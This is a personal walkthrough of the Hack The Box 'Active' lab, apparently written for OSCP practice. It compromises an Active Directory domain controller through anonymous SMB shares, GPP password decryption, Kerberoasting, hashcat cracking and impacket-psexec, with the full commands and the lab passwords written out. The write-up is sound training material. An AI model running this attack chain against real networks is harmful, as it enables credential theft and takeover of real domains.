---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Active?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Active-1791230024747.webp)


![|290](../../0.%20Assets/Active-1791230051583.webp)

---

# Walkthrough


Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.

```
nmap $T -Pn -n -sVC  --min-rate 3000 -oX results.txt -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49167,49169
```


```

┌─[bl1nk㉿kali]─[~/engagements/Active/nmap]─[󰦝 10.10.15.226]─[ 10.129.158.220]
└─❯ nmap $T -Pn -n -sVC  --min-rate 3000 -oX results.txt -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49167,49169
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-05 22:00 +0200
Nmap scan report for 10.129.158.220
Host is up (0.025s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-05 20:00:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49167/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-10-05T20:01:41
|_  start_date: 2026-10-05T19:53:42
```


Let's add the domain name to `/etc/hosts` so that `kerberos` works correctly against the machine.

```
netexec smb $T
SMB         10.129.158.220  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

Now let's do some enumeration.

```
nxc smb $T -u '' -p '' --shares
```

![](../../0.%20Assets/Active-1791231684634.webp)

Let's see what we can pull from here.

```
netexec smb $T -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
```

This turned up GPP credentials, the kind an administrator leaves behind to provision computers automatically.

![](../../0.%20Assets/Active-1791283117559.webp)

Let's decrypt them 

```
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

![](../../0.%20Assets/Active-1791283049846.webp)

Let's check whether the credentials are valid.

```
netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

![](../../0.%20Assets/Active-1791283171465.webp)

With valid credentials, let's see what access they give us.


```
./nxcspray all $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

![](../../0.%20Assets/Active-1791283310796.webp)

We have `ldap` and `smb`, so let's enumerate the shares again.

```
netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

![](../../0.%20Assets/Active-1791283910271.webp)

Now we can read `NETLOGON`, `SYSVOL` and `Users`.
Let's pull them.

```
netexec smb "$T" -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
```

The spidering wasn't cooperating, so I switched to manual enumeration.

```
smbclient //$T/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
```

![](../../0.%20Assets/Active-1791284432880.webp)

Inside the share named after the user, we find the flag.

![](../../0.%20Assets/Active-1791284451654.webp)

I went through the rest of the folders and shares without finding much, so let's move on.

Next, let's try to retrieve the domain users.

```
netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 10000
```

![](../../0.%20Assets/Active-1791285678842.webp)

Nothing stands out among the users apart from `DC$`.

Let's see what `as-rep` roasting turns up.

First, I'll build a clean list of users.
```
netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 10000  | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

![|514x182](../../0.%20Assets/Active-1791285779719.webp)

Now let's run the attack.

```
impacket-GetNPUsers 'active.htb/' \                               
  -usersfile users.txt \
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```

![](../../0.%20Assets/Active-1791285924074.webp)

No luck there, so let's try `Kerberoasting`.

```
sudo impacket-GetUserSPNs -request -dc-ip $T active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

![](../../0.%20Assets/Active-1791285992635.webp)

That worked.

Drop the entire hash into a file and run `hashcat` against it.

```
sudo hashcat -m 13100 admin.txt /usr/share/wordlists/rockyou.txt  --force
```


![](../../0.%20Assets/Active-1791286084982.webp)

Let's confirm the credentials are valid.

```
netexec smb $T -u 'administrator' -p 'Ticketmaster1968'
```

![](../../0.%20Assets/Active-1791286146583.webp)

Now let's use `psexec` over `smb` to get a shell as administrator.

```
impacket-psexec active.htb/administrator:'Ticketmaster1968'@$T
```

![](../../0.%20Assets/Active-1791286255611.webp)

![](../../0.%20Assets/Active-1791286285755.webp)

And that's the machine done.